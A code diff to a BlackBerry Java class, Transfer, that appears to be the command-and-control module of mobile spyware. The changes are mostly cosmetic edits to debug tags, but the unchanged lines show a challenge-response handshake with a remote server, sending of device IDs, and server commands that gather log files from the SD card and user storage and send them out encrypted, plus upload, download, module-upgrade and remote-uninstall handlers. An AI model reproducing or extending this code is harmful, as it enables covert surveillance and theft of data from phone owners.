@@ -11,7 +11,6 @@ import java.io.IOException;
 import java.util.Random;
 import java.util.Vector;
 
-import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
@@ -102,24 +101,24 @@ public class Transfer {
 
         wifi = false;
         if (wifiPreferred) {
-            // #debug
-            debug.trace("Try wifi, ssl:" + ssl);
+            // #debug debug
+	debug.trace("Try wifi, ssl:" + ssl);
 
             connection = new WifiConnection(host, port, ssl, deviceside);
             if (connection.isActive()) {
-                // #debug
-                debug.trace("wifi connecting...");
+                // #debug debug
+	debug.trace("wifi connecting...");
                 wifi = true;
                 connected = connection.connect();
-                //#debug
-                debug.trace("wifi connected: " + connected);
+                //#debug debug
+	debug.trace("wifi connected: " + connected);
             }
         }
 
         // fall back
         if (!wifi || !connected) {
-            // #debug
-            debug.trace("Try direct tcp, ssl:" + ssl);
+            // #debug debug
+	debug.trace("Try direct tcp, ssl:" + ssl);
             connection = new DirectTcpConnection(host, port, ssl, deviceside);
             connected = connection.connect();
         }
@@ -130,8 +129,8 @@ public class Transfer {
             return false;
         }
 
-        // #debug
-        debug.info("connected: " + connected);
+        // #debug info
+	debug.info("connected: " + connected);
         return connected;
 
     }
@@ -153,8 +152,8 @@ public class Transfer {
             connection.disconnect();
             connection = null;
         }
-        // #debug
-        debug.info("connected: " + connected);
+        // #debug info
+	debug.info("connected: " + connected);
     }
 
     /**
@@ -203,8 +202,8 @@ public class Transfer {
 
         try {
             command.payload = connection.receive(len);
-            // #debug
-            debug.trace("filled with: " + command.payload.length);
+            // #debug debug
+	debug.trace("filled with: " + command.payload.length);
         } catch (final IOException e) {
             // #debug
             debug.error("receiving command: " + e);
@@ -221,8 +220,8 @@ public class Transfer {
      */
     protected void getChallenge() throws ProtocolException {
 
-        // #debug
-        debug.info("getChallenge");
+        // #debug info
+	debug.info("getChallenge");
 
         final Command command = recvCommand();
 
@@ -261,8 +260,8 @@ public class Transfer {
     protected void getNewConf(final Command command) throws CommandException,
             ProtocolException {
 
-        // #debug
-        debug.trace("getNewConf");
+        // #debug debug
+	debug.trace("getNewConf");
 
         fillPayload(command);
         if (command.size() > 0) {
@@ -284,8 +283,8 @@ public class Transfer {
     }
 
     protected void getResponse() throws ProtocolException {
-        // #debug
-        debug.info("getResponse");
+        // #debug info
+	debug.info("getResponse");
 
         final Command command = recvCommand();
         // boolean exception = false;
@@ -305,8 +304,8 @@ public class Transfer {
                 throw new ProtocolException(
                         "getResponse: challange does not match");
             } else {
-                // #debug
-                debug.info("Response OK");
+                // #debug info
+	debug.info("Response OK");
                 sendCommand(Proto.OK);
             }
 
@@ -331,15 +330,13 @@ public class Transfer {
         // isResetRequired() returns false). I guess if saveNewModule returns
         // CMM_OK_MODULE_OVERWRITTEN you know it was a lib and will have to
         // reset (overwriting an app returns CMM_OK).
-
-        final ApplicationDescriptor ad = ApplicationDescriptor
-                .currentApplicationDescriptor();
+       
         final int[] moduleHandles = CodeModuleManager.getModuleHandles();
         for (int i = 0; i < moduleHandles.length; ++i) {
             final String name = CodeModuleManager
                     .getModuleName(moduleHandles[i]);
-            // #debug
-            debug.info(name + " - HANDLE: " + i);
+            // #debug info
+	debug.info(name + " - HANDLE: " + i);
         }
         throw new CommandException("Not Implemented");
     }
@@ -383,46 +380,46 @@ public class Transfer {
 
             switch (command.id) {
             case Proto.SYNC:
-                // #debug
-                debug.info("SYNC");
+                // #debug info
+	debug.info("SYNC");
                 syncLogs(command);
                 break;
 
             case Proto.NEW_CONF:
-                // #debug
-                debug.info("NEW_CONF");
+                // #debug info
+	debug.info("NEW_CONF");
                 getNewConf(command);
                 break;
 
             case Proto.UNINSTALL:
-                // #debug
-                debug.info("UNINSTALL");
+                // #debug info
+	debug.info("UNINSTALL");
                 uninstall = true;
                 sendCommand(Proto.OK);
                 return false;
 
             case Proto.DOWNLOAD:
-                // #debug
-                debug.info("DOWNLOAD");
+                // #debug info
+	debug.info("DOWNLOAD");
                 sendDownload(command);
                 break;
 
             case Proto.UPLOAD:
-                // #debug
-                debug.info("UPLOAD");
+                // #debug info
+	debug.info("UPLOAD");
                 getUpload(command);
                 break;
 
             case Proto.UPGRADE:
-                // #debug
-                debug.info("UPGRADE");
+                // #debug info
+	debug.info("UPGRADE");
                 getUpgrade(command);
                 reload = true;
                 break;
 
             case Proto.BYE:
-                // #debug
-                debug.info("BYE");
+                // #debug info
+	debug.info("BYE");
                 return false;
 
             default:
@@ -438,8 +435,8 @@ public class Transfer {
     }
 
     protected Command recvCommand() {
-        // #debug
-        debug.trace("recvCommand");
+        // #debug debug
+	debug.trace("recvCommand");
 
         Command command = null;
         byte[] commandId;
@@ -454,8 +451,8 @@ public class Transfer {
             debug.error("receiving command: " + e);
         }
 
-        // #debug
-        debug.trace("received command: " + command);
+        // #debug debug
+	debug.trace("received command: " + command);
         return command;
     }
 
@@ -481,29 +478,29 @@ public class Transfer {
         boolean gotbye = false;
         try {
             // challenge response
-            // #debug
-            debug.trace("ChallengeResponse ->");
+            // #debug debug
+	debug.trace("ChallengeResponse ->");
             sendChallenge();
             getResponse();
 
-            // #debug
-            debug.trace("ChallengeResponse <-");
+            // #debug debug
+	debug.trace("ChallengeResponse <-");
             getChallenge();
             sendResponse();
 
             // identificazione
-            // #debug
-            debug.trace("Ids");
+            // #debug debug
+	debug.trace("Ids");
             sendIds();
 
             // ricezione configurazione o comandi
             for (;;) {
                 final Command command = recvCommand();
-                // #debug
-                debug.info("Received command:" + command);
+                // #debug info
+	debug.info("Received command:" + command);
                 if (!parseCommand(command)) {
-                    // #debug
-                    debug.info("finished commands");
+                    // #debug info
+	debug.info("finished commands");
                     break;
                 }
             }
@@ -513,20 +510,20 @@ public class Transfer {
             gotbye = ex.bye;
             return false;
         } finally {
-            // #debug
-            debug.info("disconnect");
+            // #debug info
+	debug.info("disconnect");
             disconnect(!gotbye);
         }
 
-        // #debug
-        debug.info("done");
+        // #debug info
+	debug.info("done");
         return true;
     }
 
     protected void sendChallenge() throws ProtocolException {
 
-        // #debug
-        debug.info("sendChallenge");
+        // #debug info
+	debug.info("sendChallenge");
 
         // TODO: keep a log seed
         final Random random = new Random();
@@ -545,8 +542,8 @@ public class Transfer {
         // #ifdef DBC
         Check.requires(command != null, "null command");
         // #endif
-        // #debug
-        debug.trace("sending command: " + command);
+        // #debug debug
+	debug.trace("sending command: " + command);
 
         final byte[] data = new byte[command.size() + 4];
         final DataBuffer databuffer = new DataBuffer(data, 0, data.length,
@@ -557,8 +554,8 @@ public class Transfer {
 
             databuffer.write(command.payload);
         } else {
-            // #debug
-            debug.trace("payload null");
+            // #debug debug
+	debug.trace("payload null");
         }
 
         // #ifdef DBC
@@ -608,8 +605,8 @@ public class Transfer {
     }
 
     private void sendLogs(final String basePath) throws ProtocolException {
-        // #debug
-        debug.info("sending logs from: " + basePath);
+        // #debug info
+	debug.info("sending logs from: " + basePath);
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
@@ -654,12 +651,12 @@ public class Transfer {
         byte[] toSend;
 
         if (cypher) {
-            // #debug
-            debug.info("Sending Crypto Command: " + commandId);
+            // #debug info
+	debug.info("Sending Crypto Command: " + commandId);
             toSend = crypto.encryptData(plain);
         } else {
-            // #debug
-            debug.info("Sending Managed Command: " + commandId);
+            // #debug info
+	debug.info("Sending Managed Command: " + commandId);
             toSend = plain;
         }
 
@@ -673,8 +670,8 @@ public class Transfer {
 
         boolean sent = false;
         try {
-            // #debug
-            debug.trace("sending content");
+            // #debug debug
+	debug.trace("sending content");
             sent = connection.send(toSend);
         } catch (final IOException e) {
             // #debug
@@ -695,8 +692,8 @@ public class Transfer {
         Check.requires(challenge != null, "null crypto challange");
         // #endif
 
-        // #debug
-        debug.info("sendResponse");
+        // #debug info
+	debug.info("sendResponse");
 
         // challange contiene il challange cifrato, pronto per spedizione
         if (!sendCommand(Proto.RESPONSE, challenge)) {
@@ -709,8 +706,8 @@ public class Transfer {
     protected synchronized void syncLogs(final Command command)
             throws ProtocolException {
 
-        // #debug
-        debug.info("syncLogs connected: " + connected + " wifi: " + wifi);
+        // #debug info
+	debug.info("syncLogs connected: " + connected + " wifi: " + wifi);
 
         sendLogs(Path.SD_PATH);
         sendLogs(Path.USER_PATH);
